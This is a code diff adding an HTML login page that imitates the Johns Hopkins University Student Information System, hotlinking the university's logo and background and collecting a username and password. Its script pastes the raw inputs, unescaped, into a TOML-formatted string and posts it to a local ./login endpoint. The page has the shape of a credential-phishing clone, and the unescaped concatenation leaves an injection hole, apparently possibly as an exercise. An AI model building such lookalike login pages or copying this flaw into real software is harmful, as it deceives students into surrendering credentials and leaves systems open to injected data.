@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+    <!-- Include jQuery -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        @font-face {
+            font-family: 'Lato';
+            src: url('fonts/Lato-Regular.woff2') format('woff2');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+        body {
+            font-family: 'Lato', Arial, sans-serif;
+            margin: 0;
+            overflow: hidden;
+            background-color: #f4f4f4;
+        }
+
+        .bg-fullscreen {
+            background-image: url("https://sis.jhu.edu/SSWF/framework/modernui/Images/jhu_backgrounds/7.jpg");
+            background-size: cover;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .card {
+            padding: 30px 40px;
+            background-color: rgba(255,255,255,0.9);
+            border-radius: 10px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0px 5px 20px rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center; /* vertically centers the content */
+        }
+
+        .login-form label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 10px;
+            margin-top: 10px;
+            font-weight: 800;
+            text-align: left;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 10px 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        .login-form input:focus {
+            border-color: #007BFF;
+            outline: none;
+        }
+
+        .login-form button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+            transition: background-color 0.3s;
+        }
+
+        .login-form button:hover {
+            background-color: #0056b3;
+        }
+
+        .text-primary {
+            color: #002d72 !important;
+        }
+
+    </style>
+</head>
+<body class="bg-fullscreen">
+
+    <div class="card">
+        <img src="https://sis.jhu.edu/sswf/framework/modernui/images/logos/university.logo.large.horizontal.blue.svg" alt="Johns Hopkins University logo" style="width: 200px;">
+        <h3 class="h5 my-3 text-primary">Student Information System</h3>
+        <div class="login-form">
+            <label for="name">Username:</label>
+            <input type="text" id="name" placeholder="Enter your username">
+            <label for="password">Password:</label>
+            <input type="password" id="password" placeholder="Enter your password">
+            
+            <button onclick="sendData()">Login</button>
+        </div>
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        function sendData(){
+            var name = $("#name").val();
+            var password = $("#password").val();
+            var userData = "title = \"userData\"\n\n[user]\nname = \"" + name + "\"\npassword = \"" + password + "\"";
+            $.ajax({
+                type: "POST",
+                url: "./login",
+                data: userData,
+                contentType: 'text/plain'
+            });
+        }
+    </script>
+</body>
+</html>
